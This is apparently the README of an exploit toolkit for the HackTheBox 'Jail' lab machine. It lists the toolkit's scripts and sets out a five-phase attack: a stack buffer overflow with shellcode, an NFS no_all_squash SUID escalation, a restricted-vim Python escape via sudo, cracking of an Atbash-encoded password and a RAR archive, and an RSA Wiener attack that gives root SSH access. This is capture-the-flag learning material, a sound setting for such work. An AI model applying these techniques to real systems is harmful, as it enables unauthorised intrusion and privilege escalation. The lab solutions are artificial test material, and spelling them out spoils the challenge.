# 🏰 Jail Exploit Toolkit (`/autosolve/Jail_scripts`)

A modular exploit and automation toolkit developed for the **HackTheBox — Jail** machine (Linux / Insane).

Full technical writeup: [Jail — HackTheBox Machine Writeup](https://asbawy.com/writeups/htb-jail)

---

## 📂 Toolkit Inventory

| File | Language | Primary Function & Attack Vector |
| :--- | :---: | :--- |
| **[`breakout.py`](./breakout.py)** | `Python 3` | Two-stage 32-bit Linux x86 stack buffer overflow against the port 7411 daemon. Uses `USER` → `DEBUG` → `PASS` to leak stack pointer, overwrites return address at offset 28, and executes 27-byte `dup2(1,0)` + `execve("/bin//sh")` shellcode. |
| **[`adm_pick.py`](./adm_pick.py)** | `Python 3` | PTY-driven `sudo -u adm /usr/bin/rvim` exploit that automates swap-file prompt detection, switches to normal mode, and executes the `:py import os; os.execl('/bin/sh', ...)` sandbox escape. |
| **[`rvim_escape.py`](./rvim_escape.py)** | `Python 3` | Pwntools PTY wrapper executing arbitrary commands as `adm` via the sudo rvim embedded Python engine. |
| **[`debug/diag2.py`](./debug/diag2.py)** | `Python 3` | Diagnostic tool verifying port 7411 stack buffer address persistence across multiple `fork()` children (proving ASLR stability). |

---

## 🚀 Execution & Exploitation Workflow

### Phase 1: Port 7411 Buffer Overflow (nobody shell)

```bash
# Interactive remote shell
python3 breakout.py 10.129.63.36

# Or single command execution
python3 breakout.py 10.129.63.36 --cmd "id; uname -a"
```

### Phase 2: NFS `no_all_squash` SUID Binary (nobody → frank)

Mount the remote `/var/nfsshare` on Kali, compile a static SUID binary as local UID 1000 (`kali` / `frank`), and execute from the nobody shell:

```bash
# On Kali (UID 1000):
sudo mount -t nfs 10.129.63.36:/var/nfsshare /mnt/nfsshare
gcc -static -o /tmp/frankish frankish.c
cp /tmp/frankish /mnt/nfsshare/frankish
chmod 4777 /mnt/nfsshare/frankish

# From nobody shell on target:
/var/nfsshare/frankish
```

### Phase 3: Restricted Vim Python Escape (frank → adm)

```bash
# Execute command as adm via automated PTY handler
python3 adm_pick.py "id; ls -la /var/adm"
```

### Phase 4: Atbash Decryption & RAR Cracking

```bash
# 1. Decode Atbash message in /var/adm/.keys/.local/.frank
# -> "Escaped from Alcatraz" -> Frank Morris (1962)

# 2. Extract keys.rar with Morris1962!
unrar e -pMorris1962! keys.rar
```

### Phase 5: RSA Wiener Attack on 512-bit Key (adm → root)

```bash
# Recover root private key from extracted public key
python3 -m RsaCtfTool.main --publickey rootauthorizedsshkey.pub --private --output root_key.pem
chmod 600 root_key.pem

# SSH into root (with legacy ssh-rsa algorithms enabled)
ssh -i root_key.pem \
    -o HostKeyAlgorithms=+ssh-rsa \
    -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    root@10.129.63.36
```

---

## 🛠️ Requirements & Dependencies

```bash
pip3 install pwntools
```
